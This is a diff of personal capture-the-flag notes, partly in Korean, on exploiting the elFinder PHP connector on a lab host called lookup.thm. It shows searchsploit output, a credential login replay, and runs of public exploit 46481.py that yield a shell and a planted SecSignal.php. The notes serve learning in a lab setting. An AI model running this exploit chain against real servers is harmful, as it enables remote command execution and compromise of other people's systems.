@@ -364,46 +364,76 @@ Note: Unnecessary use of -X or --request, POST is already inferred.
 
 http --session=auth_session GET http://files.lookup.thm/ Cookie:"login_status=success"
 
+# 쿠키 재사용
+
+http --session=lookup_session POST http://lookup.thm/login.php username=jose password=password123
+
 # exploitDB
 
 ──(root㉿vbox)-[/usr/…/exploitdb/exploits/php/webapps]
-└─# searchsploit elfinder 2. 
+└─# searchsploit elfinder 2.
 4------------------------------------------- ---------------------------------
- Exploit Title                             |  Path
-------------------------------------------- ---------------------------------
+Exploit Title | Path
+
+---
+
 elFinder 2 - Remote Command Execution (via | php/webapps/36925.py
-elFinder 2.1.47 - 'PHP connector' Command  | php/webapps/46481.py
+elFinder 2.1.47 - 'PHP connector' Command | php/webapps/46481.py
 elFinder PHP Connector < 2.1.48 - 'exiftra | php/remote/46539.rb
 elFinder PHP Connector < 2.1.48 - 'exiftra | php/remote/46539.rb
 elFinder Web file manager Version - 2.1.53 | php/webapps/51864.txt
-------------------------------------------- ---------------------------------
+
+---
+
 Shellcodes: No Results
-                                                                             
+
 ┌──(root㉿vbox)-[/usr/…/exploitdb/exploits/php/webapps]
 └─# ./46481.py
-  File "/usr/share/exploitdb/exploits/php/webapps/./46481.py", line 34
-    print "Usage: python exploit.py [URL]"
-    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+File "/usr/share/exploitdb/exploits/php/webapps/./46481.py", line 34
+print "Usage: python exploit.py [URL]"
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 SyntaxError: Missing parentheses in call to 'print'. Did you mean print(...)?
 
-
 # exploit
-       
+
 ┌──(root㉿vbox)-[/usr/…/exploitdb/exploits/php/webapps]
 └─# python2 ./46481.py http://files.lookup.thm/elFinder
 [*] Uploading the malicious image...
 [*] Running the payload...
 [*] The site seems not to be vulnerable :(
-                                                                             
+
 ┌──(root㉿vbox)-[/usr/…/exploitdb/exploits/php/webapps]
 └─# python2 ./46481.py http://files.lookup.thm/elFinder/php/connector.minimal.php
 [*] Uploading the malicious image...
 [*] Running the payload...
 [+] Pwned! :)
 [+] Getting the shell...
-$ 
 
+# 연결이 된줄 알았으나 아니었음 touch SecSignal.jgp 빈 파일 이름만 jpg 로 생성 -> 실패 -> 진짜 jpg 가 아니여서 진짜 jpg 로 바꿔서 실행해봄
 
-# 쿠키 재사용
+/home/kali/Downloads/360_F_143428338_gcxw3Jcd0tJpkvvb53pfEztwtU9sxsgT.jpg
 
-http --session=lookup_session POST http://lookup.thm/login.php username=jose password=password123
+┌──(root㉿vbox)-[/usr/…/exploitdb/exploits/php/webapps]
+└─#
+
+┌──(root㉿vbox)-[/usr/…/exploitdb/exploits/php/webapps]
+└─#
+
+┌──(root㉿vbox)-[/usr/…/exploitdb/exploits/php/webapps]
+└─# cp /home/kali/Downloads/360_F_143428338_gcxw3Jcd0tJpkvvb53pfEztwtU9sxsgT.jpg SecSignal.jpg
+
+┌──(root㉿vbox)-[/usr/…/exploitdb/exploits/php/webapps]
+└─# python2 46481.py http://files.lookup.thm/elFinder/php/connector.minimal.php
+[*] Uploading the malicious image...
+[*] Running the payload...
+[+] Pwned! :)
+[+] Getting the shell...
+$ ls
+{"error":["errUnknownCmd"]}
+$
+
+# 진짜 jpg 로 바꾸고 실행하니 에러 -> 하지만?
+
+http://files.lookup.thm/elFinder/php
+
+- 위 경로에 접근해보니 SecSignal.php 파일이 생성되어 있음!
